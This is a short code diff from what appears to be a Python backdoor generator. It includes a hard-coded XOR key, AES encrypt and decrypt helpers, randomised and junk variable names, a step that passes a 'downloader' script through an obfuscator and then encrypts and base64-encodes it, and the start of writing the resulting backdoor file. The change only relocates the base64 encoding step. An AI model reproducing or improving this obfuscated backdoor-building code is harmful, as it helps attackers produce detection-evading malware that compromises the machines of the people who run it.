@@ -96,7 +96,7 @@ else:
 xorkey = 'TZlzMXDLquhhYLEMMpF4vNTloxT0uMDcOiE2pq8yPv761nbWnNnqBGVro4fNeDIwCRJYjD9KJOq5VRqXCooPpESWBjj5gfMEI4vTBgvjp20VTzE8aErDOsytkepDvvyZ2jbW5riFQTmeMDK4N4qz7OpH9iOv4UApTKR2Oeo47lvrVvNQfpFEmQUUshwYMibqtWgXmDti8qXItw6HZ7mW3fNYSa8s9YgQPEZvuurvXN7ufUwIO0idubEyUjsNbU4mTRLdCqDxP8HH3qn3fAJacVIW9C1Aznmxj17tDqiXc6bf72VOG2hj3nrw7PVDDNuQ11D5Af8KPvyTEhmVr44MDlqqlTLRZDmtzPUwB8Yzs633pNVpfW4T5RnyZcTVgdwa3IG8d3Ce5RrA1Rg7NTItONlGQ7xgd3ds3TvXbXtxqIl6WRSANduBhpzPpPDTxB4CHZHnsXEOJDGPGAgozetK3oJl5HcItYLW9OxGDqnMm9HekEtTO33oYVk5QXEAEekycFOYBlLppVJgfBBaZybZsxcszCqLrwdUvOLOkaLEjHa0KW58Sra3YUgBVpPU5gDGZpWCJtJojzXUnWgAHwoe5yXeqwaaJke8U4KiZPjiJDm2nu8zJhzF1tOYYnkDYFLeTiWnwGQyvFJSUym9buGSWRARLIhBi61dYy2TiHpwkjFjEt9Rq5YAdGuBzQx1HCObTnwzvDznEcbYWEc8ZFBimRYIX2YzRMH9rHBl1vFb8727FukdLwn8PkokID3L6VeO7rSJKg4r3EpH6Mqk8GbwuSdnap4RECTcYETkAxkkfD3yHmDoFfuuwDJ9EjHjRFAR9qgE8VLAey2ql11K3arMAsCzk8IPhiFTP3OXSclSQ6nV32wSTMPl0aGdrQgbpo0h3ZqFjyV4FL4pJqpoLB2cYWLr8BAn0vMiyyDeiTeDTIklPLd01ozcfBtZsj9xnUECnJfOKTM2ULlMU0eGksmho44IAtlpAMU5zy3kzKXR'
 BLOCK_SIZE, PADDING = 32, '{'
 pad = lambda s: str(s) + (BLOCK_SIZE - len(str(s)) % BLOCK_SIZE) * PADDING
-EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))
+EncodeAES = lambda c, s: c.encrypt(pad(s))
 DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)
 key, key2, iv, secretkey = randKey(32), randKey(32), randKey(16), randKey(32)
 be64var, bd64var, AESvar, envvar, bz2var, urlvar, keyvar, junkvar = randVar(), randVar(), randVar(), randVar(), randVar(), randVar(), randVar(), randVar()
@@ -174,7 +174,7 @@ obstime = subprocess.Popen('python tools/pyobfuscate.py -s %s tempobfs.py' % (''
 downloaderscript = obstime.stdout.read()
 os.remove('tempobfs.py')
 cipher = AES.new(key2)
-downloader = EncodeAES(cipher, downloaderscript)
+downloader = base64.b64encode(EncodeAES(cipher, downloaderscript))
 
 with open(backdoorName, 'w') as f:
 	f.write('#!/usr/bin/env python\nimport ')
